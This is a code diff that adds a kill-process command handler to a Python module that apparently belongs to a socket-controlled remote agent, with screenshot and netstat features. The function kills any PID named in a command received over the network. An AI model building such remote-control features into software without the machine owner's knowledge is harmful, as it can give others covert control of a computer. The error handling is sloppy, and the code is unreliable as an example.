@@ -1,6 +1,6 @@
 from socket_handlers import *
 from urllib.parse import unquote
-import os, base64, binascii, requests, ctypes, subprocess, psutil, json, platform
+import os, base64, binascii, requests, ctypes, subprocess, psutil, json, platform, re
 from pathvalidate import sanitize_filename, sanitize_filepath
 from typing import Tuple
 from mss import mss
@@ -733,3 +733,27 @@ def execute_netstat(socket: socket.socket) -> bool:
     except Exception as e:
         socket_send(socket, f"Unexpected error while running netstat: {str(e)}")
         return False
+
+
+def kill_process(socket: socket.socket, command: str) -> bool:
+    try:
+        match = re.search(r"kill\s+(\d+)", command)
+        if not match:
+            socket_send(socket, "Invalid kill command format. Usage: kill <PID>")
+            return False
+        else:
+            pid = match.group(1)
+            result = subprocess.run(
+                ["kill", pid], capture_output=True, text=True, check=True
+            )
+
+            if result.returncode == 0:
+                socket_send(socket, f"Successfully killed process with PID {pid}")
+                return True
+            else:
+                socket_send(
+                    socket, f"Failed to kill process {pid}. Error: {result.stderr}"
+                )
+                return False
+    except:
+        pass
